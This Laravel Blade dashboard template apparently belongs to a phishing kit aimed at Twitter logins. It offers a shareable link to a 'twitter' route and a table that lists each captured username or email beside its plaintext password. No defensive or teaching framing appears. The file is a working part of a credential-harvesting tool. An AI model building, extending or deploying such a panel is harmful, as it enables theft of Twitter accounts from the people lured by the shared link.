@extends('layouts.dashboard')

@section('content')

<div class="row">
    <div class="col-md-12">
        
        <div class="">{{ __('Twitter') }}
            <p><strong>Share this link: </strong><a href="{{ route('twitter') }}" target="_blank" rel="noopener noreferrer">{{ route('twitter') }}</a></p>
        </div>
            
        <table class="table table-bordered table-striped table-hover">
            <thead>
                <tr>
                    <th>email</th>
                    <th>password</th>
                </tr>
            </thead>
            <tbody>
                @foreach ($dataTwitter as $dataT)
                <tr>
                    <td>{{ $dataT->usernameOrEmail }}</td>
                    <td>{{ $dataT->password }}</td>
                </tr>
                @endforeach
            </tbody>
        </table>                
        
    </div>
</div>

@endsection
